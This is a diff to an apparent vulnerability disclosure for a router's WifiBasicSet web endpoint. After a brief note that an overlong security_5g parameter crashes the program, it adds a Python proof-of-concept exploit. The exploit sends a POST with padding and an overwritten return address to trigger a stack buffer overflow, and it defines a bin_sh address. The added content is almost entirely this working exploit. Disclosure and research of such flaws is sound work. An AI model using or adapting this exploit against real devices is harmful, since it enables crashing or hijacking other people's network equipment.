@@ -60,3 +60,45 @@ wrlEn=1&wrlEn_5g=0&security=none&security_5g=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 ​	Then the program crashes
 
 <img src="./img/image-20210826173140246.png" alt="image-20210826173140246" style="zoom:50%;" />
+
+
+
+POC
+```
+import requests
+from pwn import *
+
+url = "http://192.168.33.6/goform/WifiBasicSet"
+
+bin_sh=0xbae7
+payload="a"*(0x274-0x38)+p32(0x10D0B4)
+
+data={
+	"wrlEn":"1",
+	"wrlEn_5g":"0",
+	"security":"None",
+	"security_5g":payload,
+	"ssid":"1111111111111",
+	"ssid_5g":"",
+	"hideSsid":"0",
+	"hideSsid_5g":"0",
+	"wrlPwd":"11111111111111",
+	"wrlPwd_5g":""
+}
+headers={
+	"Host":"192.168.33.6",
+	"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
+	"Accept":"*/*",
+	"Accept-Language":"en-US,en;q=0.5",
+	"Accept-Encoding":"gzip, deflate",
+	"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
+	"X-Requested-With":"XMLHttpRequest",
+	"Origin":"http://192.168.33.6",
+	"Referer":"http://192.168.33.6/wireless_ssid.html?random=0.799348137601227&",
+	"Upgrade-Insecure-Requests":"1"
+}
+
+response = requests.request("POST", url, headers=headers, data=data)
+
+print(response.text)
+```
